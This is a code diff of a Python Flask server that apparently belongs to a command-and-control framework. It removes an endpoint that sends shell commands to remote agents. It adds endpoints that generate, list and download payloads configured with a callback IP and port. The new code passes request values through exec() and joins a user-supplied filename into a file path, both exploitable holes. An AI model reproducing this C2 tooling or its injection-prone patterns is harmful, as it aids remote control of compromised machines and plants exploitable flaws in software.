@@ -2,15 +2,17 @@ from lib.vglobals.servercfg import *
 from lib.vglobals.sharedvars import *
 from lib.globals import refresh_available_listeners, listeners_available
 
-from handler import run as handler_run
 from lib.sthread import Sthread
 from lib import response
 
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_file
 from hashlib import sha256
+from os import listdir
 from uuid import uuid4
+from importlib import import_module
+from inspect import _empty, signature as func_signature
 
-import json
+from handler import run as handler_run
 
 app = Flask(__name__)
 
@@ -105,31 +107,100 @@ def get_listeners_types(session: str):
     
     return jsonify(listeners_available)
 
-@app.route("/send_command", methods=["POST"])
-def send_command():
+@app.route("/payload_generate", methods=["POST"])
+def payload_generate():
     if request.json is None:
         return response.json_body_empty
-
+    
     session: str = request.json["auth"]
 
     if not session in list(clients_session.values()):
         return response.invalid_sessionid
+
+    # ...
+
+    payload_name: str = request.json["payload"]
+    payload_output: str = request.json["output"]
     
-    target_id: str = request.json["target"]
-    command: str = request.json["cmd"]
+    """
+    {
+        "ip": "127.0.0.1",
+        "port": 6666,
+        ...
+    }
+    """
+    config_dict: dict = request.json["config"]
 
-    if not target_id in list(agents.keys()):
-        return "Agent not found", 500
+    if not path.exists(path.join("payload", payload_name)):
+        return response.payload_not_found
+
+    payload_path = "/".join(("payload", payload_name))
+    payload_builder = import_module(".".join(("payload", payload_name, "setup")))
+    config_obj = getattr(payload_builder, "Config")
+
+    line_parameters = []
+
+    for k, v in config_dict.items():
+        if isinstance(v, str):
+            v = "\"{}\"".format(v)
+
+        line_parameters.append("{}={}".format(k, v))
+
+    config_obj = getattr(payload_builder, "Config")
+    config_instance = config_obj(output=payload_output, cpath=payload_path)
+
+    exec(f"config_instance.run({','.join(line_parameters)})")
+
+    return payload_output
+
+@app.route("/payload_download/<session>", methods=["POST"])
+def payload_download(session):
+    if not session in list(clients_session.values()):
+        return response.invalid_sessionid
     
-    agent = agents[target_id]
-
-    job_n = len(jobs.keys()) + 1
-
-    agent.send(json.dumps({"exec": command, "job": job_n}).encode())
-
-    jobs[job_n] = None
+    payload_filename = path.join("payload", request.form["filename"])
     
-    return jsonify({"job": job_n})
+    if not path.exists(payload_filename):
+        return response.payload_not_found
+    
+    return send_file(payload_filename) 
+
+@app.route("/payload_get/<session>")
+def payload_get(session):
+    if not session in list(clients_session.values()):
+        return response.invalid_sessionid
+    
+    return listdir(path.join("payload"))
+
+@app.route("/payload_config", methods=["POST"])
+def payload_config():
+    if request.json is None:
+        return response.json_body_empty
+    
+    session: str = request.json["auth"]
+
+    if not session in list(clients_session.values()):
+        return response.invalid_sessionid
+
+    payload_name: str = request.json["payload"]
+
+    if not path.exists(path.join("payload", payload_name)):
+        return response.payload_not_found
+    
+    payload_builder = import_module(".".join(("payload", payload_name, "setup")))
+    config_obj = getattr(payload_builder.Config, "run")
+
+    parameters = [] # name, is_required
+
+    for parameter in func_signature(config_obj).parameters.values():
+        if parameter.name == "self":
+            continue
+        
+        is_required = isinstance(parameter.default(), _empty)
+        
+        parameters.append([parameter.name, is_required])
+
+    return jsonify(parameters)
 
 def run(ip: str, port: int, ssl=False, ssl_context=()):
     if ssl:
